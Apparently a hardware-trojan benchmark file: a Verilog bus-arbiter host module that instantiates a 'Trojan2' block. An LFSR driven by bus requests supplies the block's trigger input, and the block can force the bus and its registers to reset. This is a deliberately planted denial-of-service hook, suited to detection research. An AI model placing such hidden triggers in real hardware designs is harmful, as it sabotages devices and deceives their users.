// Bus Host Circuit for Trojan2
module trojan2_bus0_host #(
    parameter [127:0] REG1_INIT = 128'h0123456789ABCDEF0123456789ABCDEF,
    parameter [127:0] REG2_INIT = 128'h29174698719274389DAB890A09844DFE,
    parameter [127:0] REG3_INIT = 128'h1234567890ABCDEF0123456789ABCDEF,
    parameter [127:0] REG4_INIT = 128'h248AF889AAD811223CBDAA77856EE81F,
    parameter [127:0] LFSR_INIT = 128'h0123456789ABCDEF0123456789ABCDEF
)(
    input wire clk,
    input wire rst,
    input wire [31:0] master_data,
    input wire master_req,
    input wire [1:0] reg_sel,
    output reg [31:0] slave_data,
    output reg bus_ack
);

    // Trojan interface (fixed width)
    wire [7:0] trojan_data_in;
    wire trojan_force_reset;
    
    // Bus arbiter state - fixed constants
    reg [127:0] lfsr;
    reg [2:0] bus_state;
    reg [31:0] slave_registers [0:3];
    
    // Loop variable
    integer k;
    
    // Generate lfsr for trojan conditional trigger
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            lfsr <= LFSR_INIT;
        end else if (master_req) begin
            lfsr <= {lfsr[126:0], lfsr[127] ^ lfsr[6] ^ lfsr[1] ^ lfsr[0]};
        end
    end
    
    assign trojan_data_in = lfsr[7:0];
    
    // Bus arbiter logic
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            slave_data <= 32'h0;
            bus_ack <= 1'b0;
            bus_state <= 3'b000;
            // Initialize slave registers
            slave_registers[0] <= REG1_INIT;
            slave_registers[1] <= REG2_INIT;
            slave_registers[2] <= REG3_INIT;
            slave_registers[3] <= REG4_INIT;
        end else if (trojan_force_reset) begin // Force reset from trojan
            slave_data <= 32'h0;
            bus_ack <= 1'b0;
            bus_state <= 3'b000;
            // Initialize slave registers
            slave_registers[0] <= REG1_INIT;
            slave_registers[1] <= REG2_INIT;
            slave_registers[2] <= REG3_INIT;
            slave_registers[3] <= REG4_INIT;
        end else begin
            case (bus_state)
                3'b000: begin // IDLE
                    bus_ack <= 1'b0;
                    if (master_req) begin
                        bus_state <= 3'b001;
                    end
                end
                3'b001: begin // ARBITRATION
                    bus_state <= 3'b010;
                end
                3'b010: begin // DATA_TRANSFER
                    slave_registers[reg_sel] <= master_data;
                    bus_state <= 3'b011;
                end
                3'b011: begin // OUTPUT_DATA
                    slave_data <= slave_registers[reg_sel];
                    bus_ack <= 1'b1;
                    bus_state <= 3'b100;
                end
                3'b100: begin // COMPLETE
                    bus_ack <= 1'b0;
                    bus_state <= 3'b000;
                end
                default: bus_state <= 3'b000;
            endcase
        end
    end
    
    // Instantiate Trojan2
    Trojan2 trojan_inst (
        .clk(clk),
        .rst(rst),
        .data_in(trojan_data_in),
        .force_reset(trojan_force_reset)
    );

endmodule

